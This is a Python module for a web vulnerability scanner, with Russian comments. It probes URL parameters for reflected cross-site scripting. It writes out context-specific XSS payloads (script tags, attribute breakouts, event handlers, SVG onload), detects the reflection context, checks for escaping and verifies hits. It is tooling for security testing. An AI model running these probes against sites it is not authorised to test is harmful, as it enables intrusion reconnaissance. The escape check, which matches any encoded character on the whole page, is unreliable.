"""xss v7 — content-type gate + escape-aware + one finding per (param, context)"""
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient
from core.verify import verify, confidence, is_signal

MARKER = "omni7x9z"

# по одному payload на контекст — этого достаточно для демонстрации XSS
PAYLOADS = {
    "html_body":     f'<script>alert("{MARKER}")</script>',
    "attr_double":   f'"><script>alert("{MARKER}")</script>',
    "attr_single":   f"'><script>alert('{MARKER}')</script>",
    "attr_unquoted": f' onmouseover=alert("{MARKER}") x="',
    "js_string":     f"';alert('{MARKER}');//",
    "svg":           f'<svg onload=alert("{MARKER}")>',
}

# все виды экранирования, которые убивают XSS
ESCAPE_PATTERNS = [
    re.compile(r"&lt;", re.I),                 # HTML entity
    re.compile(r"&#x3c;", re.I),               # hex entity
    re.compile(r"&#60;", re.I),                # decimal entity
    re.compile(r"\\u003c", re.I),              # JSON escape
    re.compile(r"%3c", re.I),                  # URL escape
    re.compile(r"&amp;lt;", re.I),             # double-escape
]

HTML_CONTENT_TYPES = ("text/html", "application/xhtml", "text/xml", "application/xml")


class Xss:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        params = parse_qs(u.query) or {"q": ["test"]}
        http = HttpClient(session, logger)

        base = http.get(target)
        if not base:
            print("[xss] no baseline")
            return {"findings": []}

        # === Content-Type gate ===
        ct = (base.headers.get("Content-Type") or "").lower()
        if not any(hct in ct for hct in HTML_CONTENT_TYPES):
            print(f"[xss v7] skip — Content-Type='{ct}' не HTML, XSS невозможен")
            return {"findings": []}

        print(f"[xss v7] baseline: {base.status_code} {len(base.content)}b ct={ct}")
        print(f"[xss v7] params: {list(params.keys())}")

        findings = []

        for name in params:
            # 1. detect context — по уникальному маркеру
            context = self._detect_context(http, u, params, name)
            print(f"  [{name}] context: {context}")

            # 2. пробуем payload, соответствующий контексту
            payload = PAYLOADS.get(context, PAYLOADS["html_body"])
            r = http.get(self._url(u, params, name, payload))
            if not r:
                continue

            # === ГЛАВНАЯ ПРОВЕРКА: payload отражён и НЕ экранирован ===
            if payload not in r.text:
                # пробуем ещё пару payload'ов, но только для правильного контекста
                for alt_ctx in self._alt_contexts(context):
                    alt_payload = PAYLOADS.get(alt_ctx)
                    if not alt_payload:
                        continue
                    r_alt = http.get(self._url(u, params, name, alt_payload))
                    if r_alt and alt_payload in r_alt.text and not self._is_escaped(r_alt.text):
                        payload = alt_payload
                        context = alt_ctx
                        r = r_alt
                        break
                else:
                    continue

            # проверка на экранирование
            if self._is_escaped(r.text, payload):
                print(f"  [{name}] reflected but encoded → skip")
                continue

            # === verify — 2 повтора ===
            def rep():
                try:
                    return http.get(self._url(u, params, name, payload))
                except Exception:
                    return None

            def predicate(s):
                return payload in s["body"]

            ratio, hits = verify(rep, predicate, n=2, delay=0.2)

            signal_strength = 0.9  # raw reflection без экранирования — сильный сигнал
            conf = confidence(signal_strength, ratio, baseline=None, sample=None)
            if not is_signal(conf, floor=0.55):
                print(f"  [{name}] verify failed ({hits}/2)")
                continue

            # === ОДИН finding на пару (param, context) ===
            idx = r.text.find(payload)
            evidence = r.text[max(0, idx - 30):idx + len(payload) + 30]
            findings.append({
                "param": name,
                "context": context,
                "payload": payload,
                "confidence": int(conf * 100),
                "evidence": evidence[:200],
            })
            logger.finding("xss_verified", "high",
                           f"{name} ({context}) conf={int(conf*100)}")
            print(f"  ✓ CONFIRMED {name} ({context}) conf={int(conf*100)}")

        print()
        print(f"[xss v7] findings: {len(findings)}")
        return {"findings": findings}

    def _is_escaped(self, text, payload=None):
        """Проверяет, есть ли признаки экранирования."""
        for pat in ESCAPE_PATTERNS:
            if pat.search(text):
                return True
        return False

    def _alt_contexts(self, ctx):
        """Альтернативные контексты для fallback (без перебора всех)."""
        order = ["html_body", "attr_double", "attr_single", "svg"]
        return [c for c in order if c != ctx]

    def _detect_context(self, http, u, params, name):
        """Определить контекст по позиции маркера в ответе."""
        marker = f"CTX{MARKER}CTX"
        r = http.get(self._url(u, params, name, marker))
        if not r or marker not in r.text:
            return "html_body"

        idx = r.text.find(marker)
        before = r.text[max(0, idx - 100):idx]

        if re.search(r'<script[^>]*>[^<]*$', before, re.I):
            return "js_string"
        if re.search(r'=\s*"[^"]*$', before):
            return "attr_double"
        if re.search(r"=\s*'[^']*$", before):
            return "attr_single"
        if re.search(r'<[a-zA-Z]+\s+\w+=\s*$', before):
            return "attr_unquoted"
        if "<svg" in before.lower() or "<math" in before.lower():
            return "svg"
        return "html_body"

    def _url(self, u, params, name, payload):
        q = dict(params)
        q[name] = [payload]
        return urlunparse(u._replace(query=urlencode(q, doseq=True)))
